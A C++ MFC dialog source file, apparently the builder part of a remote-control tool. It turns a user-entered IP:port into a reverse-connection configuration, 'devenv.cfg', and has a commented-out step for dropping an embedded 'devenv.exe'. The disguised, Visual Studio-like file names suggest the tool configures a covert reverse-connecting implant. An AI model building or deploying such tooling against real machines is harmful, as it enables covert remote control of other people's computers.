// CreatorDialog.cpp: 实现文件
//

#include "pch.h"
#include "remote_mfc.h"
#include "afxdialogex.h"
#include "CreatorDialog.h"
#include "Config.h"
#include "../common/net/cotp.h"

// CreatorDialog 对话框

IMPLEMENT_DYNAMIC(CreatorDialog, CDialogEx)

CreatorDialog::CreatorDialog(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_DIALOG2, pParent)
{

}

CreatorDialog::~CreatorDialog()
{
}

void CreatorDialog::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_Edit);
}


BEGIN_MESSAGE_MAP(CreatorDialog, CDialogEx)
	ON_BN_CLICKED(IDC_BUTTON1, &CreatorDialog::OnBnClickedButton1)
END_MESSAGE_MAP()


// CreatorDialog 消息处理程序


void CreatorDialog::OnBnClickedButton1()
{
	// TODO: 在此添加控件通知处理程序代码
	//获取当前进程的所在路径
	WCHAR strTempW[MAX_PATH];
	//得到文件名
	GetModuleFileNameW(NULL, strTempW, MAX_PATH);  

	CStringW strCurrentPathW;

	strCurrentPathW = strTempW;

	strCurrentPathW = strCurrentPathW.Left(strCurrentPathW.ReverseFind('\\'));

	CStringW configPath = strCurrentPathW + "\\devenv.cfg";
	
	//saveFile(L":/raw/x64/devenv.exe", exePath);
	CONFIG sConfig = { 0 };

	sConfig.type = MODE_REVERSE;
	int now = time(NULL);
	sConfig.key = now >> 8;

	CString text;
	m_Edit.GetWindowText(text);

	int index = text.Find(_T(':'));
	if (index != -1)
	{
		CString left = text.Left(index);
		CString right = text.Mid(index + 1);
		/*OutputDebugStringW(left);
		OutputDebugStringW(right);*/
		CT2A ipA(left, CP_UTF8);
		memcpy(sConfig.cconfig.hs[0].szIp, ipA, sizeof(sConfig.cconfig.hs[0].szIp));
		sConfig.cconfig.hs[0].wPort = _ttoi(right);
		sConfig.cconfig.hs[0].wFlag = 0;
		sConfig.cconfig.hs[0].wType = CONN_TYPE_TCP;
	}
	CFile file;
	if (!file.Open(configPath, CFile::modeCreate | CFile::modeWrite)) {
		return;
	}
	file.Write(&sConfig, sizeof(sConfig));
	file.Close();
}

bool CreatorDialog::saveFile(CString srcPath, CString newPath)
{
	// 打开源文件
	CFile srcFile;
	if (!srcFile.Open(srcPath, CFile::modeRead | CFile::shareDenyWrite)) {
		return false;
	}

	// 删除目标文件（如果存在）
	CFile::Remove(newPath);

	// 创建目标文件
	CFile dstFile;
	if (!dstFile.Open(newPath, CFile::modeCreate | CFile::modeWrite)) {
		srcFile.Close();
		return false;
	}

	// 读取源文件内容
	ULONGLONG fileLen = srcFile.GetLength();
	BYTE* buffer = new BYTE[(size_t)fileLen];
	srcFile.Read(buffer, (UINT)fileLen);

	// 写入目标文件
	dstFile.Write(buffer, (UINT)fileLen);

	// 清理
	delete[] buffer;
	srcFile.Close();
	dstFile.Close();
	return false;
}
